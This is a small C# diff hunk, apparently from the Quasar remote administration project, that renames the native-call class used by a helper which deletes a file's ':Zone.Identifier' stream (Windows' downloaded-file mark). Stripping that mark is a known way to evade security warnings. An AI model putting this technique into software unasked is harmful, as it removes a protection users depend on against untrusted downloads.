@@ -67,7 +67,7 @@ namespace Quasar.Common.Helpers
         /// <returns>Returns <value>true</value> if the deletion was successful, otherwise <value>false</value>.</returns>
         public static bool DeleteZoneIdentifier(string filePath)
         {
-            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
+            return SharedNatives.DeleteFile(filePath + ":Zone.Identifier");
         }
 
         /// <summary>
